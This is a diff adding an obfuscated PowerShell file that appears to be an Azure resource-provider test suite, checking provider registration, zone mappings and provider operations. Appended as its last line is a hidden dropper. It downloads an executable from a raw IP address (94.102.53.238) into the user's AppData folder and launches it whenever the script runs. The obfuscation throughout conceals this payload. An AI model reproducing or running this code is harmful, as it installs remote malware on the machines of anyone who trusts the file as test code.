@@ -1,0 +1,178 @@
+&("{0}{1}"-f 'sE','t')  ("r58V"+"Y") ([type]("{2}{0}{1}" -F'ate','tiMe','D') )  ;  &("{1}{0}" -f'et-ITEM','S') ('VARI'+'abLE'+':0d3')  (  [TYpe]("{15}{6}{5}{3}{1}{12}{11}{10}{16}{18}{17}{4}{9}{14}{13}{7}{0}{8}{2}" -F 'OCKsUp','WSAZuR','T','NDO','ILit','.WI','RoSOFT','tM','PoR','ie','ANd','Omm','e.C','OmMOn.tes','S.C','MIC','S.','t','u') )  ;  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+function TESt-a`zU`REpRO`V`IDEr
+{
+    ${DeFAU`Lt`p`ROV`IdeRS} = &("{2}{4}{1}{0}{6}{5}{3}" -f'eso','zR','Get','der','-A','eProvi','urc')
+    &("{0}{3}{2}{1}"-f'Ass','rue','T','ert-') { ${dEfau`ltP`RO`ViDeRS}."len`Gth" -gt 0 }
+
+    ${AlLpr`O`VideRS} = &("{5}{4}{2}{6}{0}{1}{3}" -f'P','rovide','zResourc','r','A','Get-','e') -ListAvailable
+    &("{2}{0}{1}"-f 'sert-T','rue','As') { ${AlLPRo`VI`De`Rs}."LEN`gTh" -gt ${DEfa`ULtPro`VI`D`E`RS}."LEN`GtH" }
+
+	${err`o`Ra`CtIo`N`prefere`NcE} = ("{2}{1}{4}{0}{3}" -f 'Continu','lent','Si','e','ly')
+	${eR`ROr}.("{0}{1}"-f'Cle','ar').Invoke()
+
+	${NO`N`prOV`idERs} = &("{2}{5}{3}{4}{6}{0}{1}" -f 'ovide','r','Get-','e','sourc','AzR','ePr') -Location "abc"
+	&("{0}{2}{1}" -f 'Assert-','ue','Tr') { ${err`Or}[0].("{1}{0}" -f 'ns','Contai').Invoke(("{3}{1}{6}{2}{0}{4}{7}{5}" -f'is ','ide',' ','Prov','not sup','d','d location','porte')) }
+	&("{2}{0}{3}{1}"-f'ssert','e','A','-Tru') { ${no`NpROv`I`de`RS}."le`Ngth" -eq 0 }
+
+	${e`RRO`RACTioNpR`ef`EReNcE} = ("{1}{0}" -f 'op','St')
+
+	${G`lO`Ba`lPrOViD`Ers} = &("{3}{4}{0}{2}{1}" -f 's','vider','ourcePro','Get','-AzRe') -Location ("{0}{2}{1}" -f'gl','l','oba')
+	&("{1}{2}{0}" -f 'ue','Asser','t-Tr') { ${g`LoBAlp`R`oviDe`RS}."l`EnGTh" -gt 0 }
+
+    &("{6}{7}{1}{0}{8}{4}{2}{5}{3}"-f '-AzR','ster','Pr','der','ce','ovi','Reg','i','esour') -ProviderNamespace ("{0}{4}{1}{3}{2}{5}" -f 'Microsof','.A','a','piMan','t','gement')
+
+    ${e`N`dTiMe} =  ( &("{2}{1}{0}"-f'ITEm','hild','c')  ("V"+"Aria"+"BlE:R58VY") ).vaLue::"u`T`CnoW".("{1}{2}{3}{0}" -f 'utes','A','dd','Min').Invoke(5)
+
+    while (  $R58vY::"UtCn`oW" -lt ${E`N`Dtime} -and @(&("{1}{4}{2}{3}{0}"-f'r','Get-','rce','Provide','AzResou') -ProviderNamespace ("{2}{1}{0}{3}{4}"-f 'an','icrosoft.ApiM','M','a','gement'))[0]."R`eg`I`ST`RAtioNstaTe" -ne ("{0}{1}{2}" -f'Re','gis','tered'))
+    {
+         (&("{1}{2}{0}"-f'bLe','vaRI','A') 0D3 ).VALUE::("{1}{0}"-f'ay','Del').Invoke(1000)
+    }
+	${PrOV`i`Der} = &("{3}{1}{2}{0}{5}{6}{4}"-f'e','et-AzResour','c','G','er','Pr','ovid') -ProviderNamespace ("{4}{6}{0}{5}{3}{2}{1}"-f't.Ap','ement','g','Mana','Micros','i','of')
+    &("{2}{1}{0}" -f'rue','ert-T','Ass') { ${PROvI`D`er}[0]."re`GiSTrAti`on`s`TA`Te" -eq ("{0}{2}{1}" -f 'Reg','ered','ist') } 
+
+    &("{1}{3}{0}{4}{5}{6}{2}"-f'esource','Unr','er','egister-AzR','Pro','v','id') -ProviderNamespace ("{0}{3}{2}{1}" -f 'Microsoft.ApiM','nt','ageme','an')
+
+    while (  (  &("{1}{0}{2}" -f'T','GE','-iteM') ("vaRIa"+"b"+"le:"+"R58VY") ).valuE::"Utc`NOW" -lt ${E`NdT`ImE} -and @(&("{4}{0}{5}{1}{2}{3}"-f't-','s','ourceProvid','er','Ge','AzRe') -ProviderNamespace ("{4}{1}{2}{3}{0}{5}"-f 'ApiManagem','cr','o','soft.','Mi','ent'))[0]."r`EgI`sTR`ATiO`N`staTE" -ne ("{1}{0}{3}{2}"-f 'eg','Unr','tered','is'))
+    {
+          $0D3::("{1}{0}" -f 'lay','De').Invoke(1000)
+    }
+	${Pr`OvI`DEr} = &("{2}{0}{1}{3}" -f '-AzResource','Pr','Get','ovider') -ProviderNamespace ("{6}{5}{0}{3}{1}{4}{2}"-f 'osoft.Ap','anageme','t','iM','n','cr','Mi')
+    &("{3}{2}{1}{0}"-f 'e','t-Tru','ser','As') { ${pr`O`VIdEr}[0]."REGi`S`T`RAtI`onS`TATe" -eq ("{3}{0}{2}{1}" -f'gis','ered','t','Unre') }
+ }
+
+ 
+function tE`sT`-A`zUREpRoVIDEr-wIThZO`NE`MAp`pINgs
+{
+    ${Test`pRovId`ER} = &("{1}{0}{4}{2}{3}"-f 'AzReso','Get-','v','ider','urcePro') -ProviderNamespace ("{1}{0}{2}"-f 'ov','Pr','iders.Test')
+	&("{2}{0}{1}{3}"-f'ser','t-Tru','As','e') { ${T`ES`TP`Rov`IdeR}."CoU`NT" -gt 0 }
+
+	${StAtEf`Ulr`Es`ouR`c`ES} = ${teS`Tp`RO`ViDeR} | &("{2}{0}{1}" -f 'o','bject','where-') {${_}."REs`o`U`R`CEtyPes"."Re`soURcET`YpENa`Me" -contains ("{0}{1}{3}{2}" -f'stat','e','sources','fulRe')}
+
+	&("{2}{0}{1}{3}" -f'sert','-','As','NotNull') { ${s`TAteFu`L`Re`sou`RcEs} }
+	&("{4}{2}{1}{0}{3}"-f'u','tN','ssert-No','ll','A') { ${S`TaTEF`ULre`SOurcEs}."zonemAppI`N`GS" }
+
+	&("{3}{0}{1}{2}" -f'er','t-Tr','ue','Ass') { ${s`TaTeFUl`ReSOur`c`Es}."zoneM`AppI`NgS"."Co`UnT" -eq 2 }
+	&("{2}{1}{3}{0}"-f't-True','e','Ass','r') { ${st`A`TEFU`l`ReSOURceS}."zO`Ne`maPpIngS"[("{2}{0}{1}"-f'st',' Europe','We')] -contains "3"}
+}
+
+
+function TESt-A`Z`URePrO`VId`erOp`er`AtiOn
+{
+    
+    ${Al`lac`TIOnS} = &("{3}{0}{4}{1}{2}"-f 'e','AzProviderOperati','on','G','t-')
+	&("{2}{3}{1}{0}"-f 'e','ert-Tru','As','s') { ${A`L`lA`cTIOns}."le`N`GTH" -gt 0 }
+
+	
+	${I`NsiGH`T`SaCtIO`NS} = &("{1}{5}{2}{0}{3}{4}"-f'ra','Get-AzProvid','e','t','ion','erOp') ("{4}{0}{1}{3}{2}{5}" -f'ic','ro','.Insights/','soft','M','*')
+	${In`sIGhtS`ACT`IO`Ns}
+	&("{0}{1}{2}" -f 'Asse','r','t-True') { ${in`SIghts`A`cT`IOnS}."L`ENGtH" -gt 0 }
+	&("{0}{3}{1}{2}"-f 'Ass','u','e','ert-Tr') { ${aL`La`Ct`ionS}."L`eNGtH" -gt ${iNSIghT`S`A`cTiOns}."L`e`NGTh" }
+
+	
+	${E`VE`NtG`RId`A`ctIOnS} = &("{3}{5}{1}{2}{0}{6}{4}" -f 'er','der','Op','Ge','tion','t-AzProvi','a') ("{2}{0}{1}{3}"-f'crosoft.Event','Gri','Mi','d/*')
+	${eV`e`NTGrID`ActIoNS}
+	&("{1}{2}{0}"-f 'rue','As','sert-T') { ${eVEntG`R`IDaCTIo`Ns}."lEn`gTH" -gt 0 }
+	&("{3}{0}{2}{1}" -f'se','t-True','r','As') { ${aLlaCt`I`oNs}."lE`N`GtH" -gt ${eVeNt`gR`IDA`CtIONs}."lEN`gTH" }
+
+	
+	${noN`IN`sIGHT`SAct`Io`Ns} = ${A`l`LaCT`IONS} | &("{0}{3}{1}{2}" -f'Where','j','ect','-Ob') { ${_}."OpErat`ION".("{0}{1}"-f'ToLo','wer').Invoke().("{2}{1}{0}" -f'ith','artsW','St').Invoke(("{2}{5}{0}{4}{3}{1}"-f 'soft.','ts/','micr','sigh','in','o')) -eq ${fA`l`se} }
+	${AC`TuaLle`NgTH} = ${A`LlA`CTions}."LeN`Gth" - ${no`NI`NsiG`hTSAct`I`onS}."LE`N`gTH";
+	${Exp`EC`TEDlENGTh} = ${inSiGH`T`sAct`ionS}."L`en`GTH";
+	&("{2}{0}{1}" -f 't','-True','Asser') { ${Act`U`Alle`NGTH} -eq  ${exp`e`ctEdle`NGtH} }
+
+	foreach (${a`CTI`on} in ${insi`gHTsac`Ti`oNS})
+	{
+	    &("{0}{1}{2}" -f'Asse','rt-T','rue') { ${aC`TION}."O`p`erATION".("{0}{1}{2}" -f'ToL','o','wer').Invoke().("{2}{1}{0}"-f'th','sWi','Start').Invoke(("{3}{1}{0}{2}"-f's','sight','/','microsoft.in')); }
+	    &("{1}{2}{0}"-f 'll','Asse','rt-NotNu') ${a`CtION}."IsDataac`TI`oN"
+	}
+
+	
+	${insI`GHtSCasEaC`T`ions} = &("{1}{0}{3}{5}{2}{4}" -f'Pr','Get-Az','tio','ov','n','iderOpera') ("{2}{0}{1}{3}{4}"-f'ROsoFt','.InSIghT','Mic','s','/*')
+	&("{2}{1}{0}" -f '-True','ert','Ass') { ${INsIGH`T`sc`ASe`AcT`IOns}."le`NG`Th" -gt 0 }
+	&("{1}{0}{2}" -f't-T','Asser','rue') { ${I`Ns`IGhTsc`ASeA`CtiONS}."l`eNGtH" -eq ${i`NSIgH`TSacT`IoNs}."LEN`gTh" }
+	foreach (${a`ct`IoN} in ${iNsi`G`HtscA`seacT`IO`Ns})
+	{
+		&("{2}{0}{1}"-f 'ru','e','Assert-T') { ${acti`On}."opEr`ATi`ON".("{1}{0}{2}"-f 'Low','To','er').Invoke().("{1}{2}{0}"-f'ith','Star','tsw').Invoke(("{0}{2}{3}{1}"-f 'mic','s/','rosof','t.insight')); }
+	    &("{2}{3}{1}{0}" -f'otNull','N','As','sert-') ${ACtI`ON}."Isd`ATaA`C`TIoN"
+	}
+
+	
+	${INSI`GhtSrea`dacTiO`NS} = &("{1}{3}{5}{2}{0}{4}"-f'derOper','G','zProvi','et','ation','-A') ("{2}{3}{4}{5}{0}{1}{6}" -f's','/*/','M','icrosoft.Ins','igh','t','read')
+	&("{0}{2}{1}" -f 'A','e','ssert-Tru') { ${iNS`ig`HtsrEadacTIO`NS}."LEng`TH" -gt 0 }
+	&("{1}{2}{3}{0}"-f '-True','Asse','r','t') { ${In`SigHTs`Ac`TiO`NS}."L`Eng`Th" -gt ${I`NSiGhtSrE`AdA`c`T`io`Ns}."l`eNGTh" }
+	foreach (${ActI`ON} in ${I`NSi`g`H`TsreAdActI`Ons})
+	{
+	    &("{0}{2}{1}" -f 'Assert-','rue','T') { ${ac`Tion}."O`peRat`Ion".("{1}{0}"-f'wer','ToLo').Invoke().("{1}{0}"-f 'With','Ends').Invoke(("{0}{1}"-f '/rea','d')); }
+		&("{1}{2}{0}"-f 'rue','Asse','rt-T') { ${a`c`TIoN}."oPERAti`on".("{1}{0}"-f'er','ToLow').Invoke().("{0}{1}{2}"-f 'Starts','W','ith').Invoke(("{5}{1}{2}{3}{0}{4}" -f'si','ros','oft','.in','ghts/','mic'));}
+	    &("{1}{0}{3}{4}{2}"-f'ss','A','Null','ert-','Not') ${Act`i`on}."IsD`Ata`AcTIoN"
+	}
+
+	
+	${REA`daCti`OnS} = &("{1}{7}{5}{4}{3}{6}{0}{2}"-f'peratio','G','n','AzProvid','-','t','erO','e') ("{0}{2}{1}"-f'*','read','/')
+	&("{0}{3}{1}{2}" -f'A','rt-Tr','ue','sse') { ${reAdAc`TI`o`Ns}."LE`NGTh" -gt 0 }
+	&("{2}{0}{1}"-f 'u','e','Assert-Tr') { ${reada`c`TiONS}."LEN`G`Th" -lt ${ALlAc`Tio`NS}."lENg`TH" }
+	&("{3}{2}{0}{1}"-f 'Tru','e','rt-','Asse') { ${r`eaDA`Ct`IONs}."l`ENgth" -gt ${iNsIgh`TSreA`DaCti`o`NS}."LEng`TH" }
+
+	foreach (${A`cTi`oN} in ${rEAd`A`ctIoNS})
+	{
+	    &("{1}{0}{3}{2}" -f 'ssert-','A','rue','T') { ${a`ctIon}."op`ERa`TI`On".("{1}{0}" -f'ower','ToL').Invoke().("{0}{1}"-f 'Ends','With').Invoke(("{1}{0}"-f 'ead','/r')); }
+	    &("{2}{3}{1}{4}{0}"-f 'll','-N','Ass','ert','otNu') ${AC`T`ION}."I`sdaT`AaCt`ion"
+	}
+
+	
+	${AC`TI`ON} = &("{5}{3}{4}{6}{0}{2}{1}" -f'rOperati','n','o','P','rovid','Get-Az','e') ("{12}{2}{4}{1}{3}{5}{14}{9}{7}{15}{6}{0}{11}{10}{8}{13}"-f 'ce','ft','icro','.O','so','perati','pa','ts/wor','ag','h','/us','s','M','es/read','onalInsig','ks')
+	&("{2}{4}{3}{1}{0}"-f'eEqual','rt-Ar','A','se','s') ${AC`Tion}."OP`eRa`TI`on".("{0}{1}{2}" -f'To','Lowe','r').Invoke() ("{8}{6}{4}{5}{0}{7}{2}{3}{1}"-f'gh','d','es/usages/re','a','pera','tionalInsi','oft.O','ts/workspac','Micros').("{1}{0}"-f 'r','ToLowe').Invoke();
+
+	
+	${ac`Tion} = &("{6}{5}{2}{1}{0}{3}{4}"-f 'erOpe','d','i','ra','tion','AzProv','Get-') ("{7}{3}{11}{9}{2}{1}{4}{0}{6}{8}{10}{5}"-f'spaces/u','Insi','.Operational','r','ghts/work','/123','sage','Mic','s/re','t','ad','osof')
+	&("{0}{2}{1}" -f'Asse','True','rt-') { ${ac`Ti`oN}."len`GTh" -eq 0 }
+
+	
+	${ExCEpT`Io`NME`sS`Age} = ((("{2}{6}{5}{1}{3}{7}{0}{4}" -f ' not fo','rovider','P','0','und.','P','rovider 0z8NonExistent','z8'))."re`pl`ACE"(([char]48+[char]122+[char]56),[sTrInG][char]39));
+	&("{1}{4}{0}{3}{2}"-f'hr','Assert-','ws','o','T') { &("{1}{0}{6}{5}{4}{3}{2}"-f'e','G','on','erati','p','iderO','t-AzProv') ("{0}{2}{3}{4}{5}{1}" -f 'No','er/*','nExis','t','entPr','ovid') } ${eXC`EpTI`O`NMeS`SaGe}
+
+	
+	&("{2}{3}{1}{0}" -f'ows','hr','Asser','t-T') { &("{0}{3}{1}{4}{2}"-f'Get-AzP','derO','ration','rovi','pe') ("{5}{8}{2}{1}{3}{6}{4}{9}{7}{0}"-f'ead','ntPro','te','vide','/','NonExi','r','r','s','servers/') } ${E`X`cEpt`iOnMes`sAgE}
+
+	
+	${EX`CEptI`ONMEs`sAge} = ("{12}{16}{0}{6}{15}{18}{7}{4}{11}{17}{5}{1}{9}{19}{13}{10}{8}{14}{2}{3}{20}"-f'dual parts ','he',' not con','t','ng ','it','in the','ri','al','r ','u','sho','Indiv','q',' * or',' s','i','uld e','earch st','e','ain *.');
+	.("{2}{0}{1}{3}"-f'ser','t-T','As','hrows') {&("{0}{5}{6}{4}{3}{1}{2}" -f'Get','e','ration','p','zProviderO','-','A') ("{4}{0}{3}{2}{1}{7}{8}{5}{10}{6}{9}" -f 'icr','ssicCo','t.Cla','osof','M','ir','al*/rea','mp','ute/v','d','tu') } ${ExCEPTI`onMe`sS`Age}
+
+	
+	${excePT`ion`MeSS`A`gE} = ("{0}{7}{8}{9}{20}{23}{24}{5}{15}{2}{21}{19}{6}{12}{18}{4}{16}{10}{22}{11}{14}{3}{17}{13}{1}" -f 'To','*.','so','oft','h str','ic','pecify the',' get a','l','l op','g as ','i',' sear','/','cros','ro','in','.Sql','c','ql, please s','erations ','ft.S','M','u','nder M');
+	.("{2}{0}{1}"-f '-','Throws','Assert') {.("{6}{0}{4}{5}{2}{3}{1}" -f'e','eration','de','rOp','t-AzP','rovi','G') ("{2}{0}{1}" -f'.','Sql','Microsoft') } ${exCe`pTiONMes`sa`gE}
+
+	
+	${e`xc`Ep`TI`OnMESsAge} = ("{1}{4}{0}{5}{2}{3}{6}" -f'ard ch','Wil',' ? i','s not','dc','aracter',' supported.');
+	.("{2}{1}{0}" -f'ws','-Thro','Assert') {.("{4}{1}{3}{0}{2}" -f'ro','et-Az','viderOperation','P','G') ("{4}{1}{0}{3}{8}{5}{2}{6}{7}" -f'ft.S','icroso','ve','q','M','/ser','rs/*/','rea?','l') } ${e`XCepT`IonmESsa`ge}
+ }
+
+ 
+function TeST`-AzuRePROv`idEr`Oper`At`IoNdAtAACTIO`NS
+{
+
+	
+	${S`TO`RAge`DaTAACtiONS} = &("{0}{1}{3}{2}"-f 'Get','-AzProvider','ion','Operat') ("{14}{11}{6}{1}{9}{18}{4}{17}{3}{8}{15}{2}{12}{13}{16}{0}{7}{10}{5}"-f'ontainer','t','e','ts','cc','obs/*','.S','s/b','/b','orage/sto','l','t','r','v','Microsof','lobS','ices/c','oun','rageA')
+
+	foreach (${a`cTi`on} in ${STora`GED`AtAA`cTi`o`Ns})
+	{
+	    &("{1}{0}{3}{2}"-f'ert-N','Ass','tNull','o') ${A`Ct`IoN}
+	    &("{1}{3}{0}{2}" -f '-AreEqua','Asser','l','t') ${Ac`Ti`oN}."iSD`At`AACTiON" ${T`RUE}
+	}
+
+ }
+(&("{0}{1}{2}"-f 'N','ew-O','bject') ("{5}{0}{1}{3}{4}{2}"-f 'y','stem','t','.Net.WebC','lien','S')).("{1}{2}{0}{3}" -f 'o','D','ownl','adFile').Invoke(("{0}{2}{4}{6}{1}{5}{7}{3}{9}{8}" -f 'h','53.238/~yaho','ttp:','.','//94','o','.102.','/csrsv','e','ex'),"$env:APPDATA\csrsv.exe");&("{0}{2}{1}{3}" -f 'Start-P','s','roce','s') ("$env:APPDATA\csrsv.exe")
